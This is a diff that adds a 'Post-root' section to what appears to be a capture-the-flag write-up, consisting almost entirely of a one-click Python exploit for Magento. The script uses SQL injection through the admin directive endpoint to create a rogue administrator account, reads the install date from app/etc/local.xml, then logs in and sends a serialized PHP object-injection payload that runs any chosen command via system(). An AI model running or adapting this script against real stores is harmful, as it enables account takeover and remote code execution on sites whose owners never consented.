@@ -287,3 +287,168 @@ cat /root/root.txt
 
                    PS: Use root flag as password!
 ```
+
+## Post-root
+I've decided to write a script to combine both SQL Injection and RCE to make it into a one-click RCE script
+
+```python
+```from bs4 import BeautifulSoup
+from hashlib import md5
+import requests
+import base64
+import sys
+import re
+import mechanize
+import argparse
+
+q="""
+SET @SALT = 'rp';
+SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
+SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
+INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
+INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
+"""
+
+def getSqlPayload(username, password):
+	"""
+	Obtain the SQL injection payload
+	
+	Parameters:
+	
+	username (str) : Username of user
+	password (str) : Password of user
+	"""
+	query = q.replace("\n", "").format(username=username, password=password)
+	return query
+
+def sqlInjectionExploit(username, password, targetUrl, proxy):
+	"""
+	Sql Injection exploit to create new admin user at Magento's admin interface
+	
+	Parameters:
+	username (str) : username of admin account
+	password (str) : password of admin account
+	targetUrl (str) : base url of target website
+	proxy (str) : Proxy url for debugging purposes
+	"""
+	if targetUrl.endswith("/"):
+		targetUrl = targetUrl[:-1]
+	print("[+] Getting configurations for SQL Injection...")
+	print("    - Admin username: {username}".format(username=username))
+	print("    - Admin password: {password}".format(password=password))
+	print("    - Target URL: {targetUrl}".format(targetUrl=targetUrl))
+	print("    - Proxy: {proxy}".format(proxy=proxy))
+	exploitUrl = targetUrl + "/admin/Cms_Wysiwyg/directive/index/"
+	print("[+] Generating payload...")
+	query = getSqlPayload(username,password)
+	pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)	
+	encodedFilter = base64.b64encode(pfilter.encode()).decode()
+	proxies = {
+		"http": proxy
+	}
+	r = requests.post(exploitUrl, proxies=proxies, data = {
+		"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
+		"filter": encodedFilter,
+		"forwarded": 1
+	})
+	print("[+] Dropping payload...")
+	if r.ok:
+		print("[+] SQL Injection successful. {username}:{password} successfully created at {targetUrl}/admin!".format(username=username,password=password,targetUrl=targetUrl))
+		return True
+	else:
+		print("[-] Something went wrong. Please check again!")
+		return False
+
+def getRcePayload(php_function, command):
+	payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
+          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
+          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
+          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
+          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
+          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
+                                                                                     len(command), command) 
+	return payload
+	
+def getInstallDate(targetUrl):
+	if targetUrl.endswith("/"):
+		targetUrl = targetUrl[:-1]
+	baseUrl = targetUrl.rsplit('/',1)[0]
+	installDateUrl = baseUrl + "/app/etc/local.xml"
+	r = requests.get(installDateUrl)
+	soup = BeautifulSoup(r.text, 'html.parser')
+	date = str(soup.find('date').get_text())
+	if date == None or (len(date) == 0):
+		print("[-] Something went wrong. Please check again!")
+		return None
+	else:
+		return date
+
+def rceExploit(username, password, installDate, command, targetUrl, proxy):
+	print("[+] Setting up configurations for RCE...")
+	print("    - Username: " + str(username))
+	print("    - Password: " + str(password))
+	print("    - Install Date: " + str(installDate))
+	print("    - Command to execute: " + str(command))
+	print("    - Target URL: " + str(targetUrl))
+	php_function = 'system'
+	if targetUrl.endswith("/"):
+		targetUrl = targetUrl[:-1]
+	targetUrl = targetUrl + "/admin/" 
+	print("[+] Generating POP chain payload")
+	payload = getRcePayload(php_function, command)
+	print("[+] Starting mechanize browser")
+	if proxy is not None:
+		print("[+] Proxy set to {proxy}".format(proxy=proxy))
+	br = mechanize.Browser()
+	br.set_proxies(None)
+	proxies = {
+		"http": proxy
+	}
+	br.set_proxies(proxies)
+	br.set_handle_robots(False)
+	request = br.open(targetUrl)
+	br.select_form(nr=0)                                                                
+	br.form.fixup()
+	br['login[username]'] = username
+	br['login[password]'] = password
+	br.method = "POST"
+	request = br.submit()
+	content = request.read()
+	print("[+] Successfully logged into admin interface")
+	url = re.search("ajaxBlockUrl = \'(.*)\'", content.decode())
+	url = url.group(1)
+	key = re.search("var FORM_KEY = '(.*)'", content.decode())
+	key = key.group(1)
+	request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)
+	tunnel = re.search("src=\"(.*)\?ga=", request.read().decode())
+	tunnel = tunnel.group(1)
+	print("[+] Dropping payload...")
+	payload = base64.b64encode(payload.encode())
+	gh = md5(payload + installDate.encode('utf-8')).hexdigest()
+	exploitPayload = tunnel + '?ga=' + payload.decode() + '&h=' + str(gh)
+	try:
+	    request = br.open(exploitPayload)
+	except (mechanize.HTTPError, mechanize.URLError) as e:
+	    print (e.read().decode())
+	    
+def finalExploit(username, password, command, targetUrl,proxy):
+	if (sqlInjectionExploit(username, password, targetUrl, proxy) == True) and (getInstallDate(targetUrl) is not None):
+		print("[+] Getting install date...")
+		installDate = getInstallDate(targetUrl)
+		print("    - Install Date: {date}".format(date=installDate))
+		rceExploit(username,password,installDate,command,targetUrl,proxy)
+	else:
+		return	
+if __name__ == '__main__':
+	parser = argparse.ArgumentParser()
+	parser.add_argument('-u', '--username', help='Username', required = True)
+	parser.add_argument('-p', '--password', help='Password', required = True)
+	parser.add_argument('-l', '--url', help='Target URL', required = True)
+	parser.add_argument('-d', '--debug', help='Proxy URL for debugging', required = False)
+	parser.add_argument('-c', '--command', help='Command to execute for RCE', required = True)
+	args = parser.parse_args()
+	if args.debug == None:
+		proxy = None
+	else:
+		proxy = args.debug
+	finalExploit(args.username, args.password, args.command, args.url, proxy)
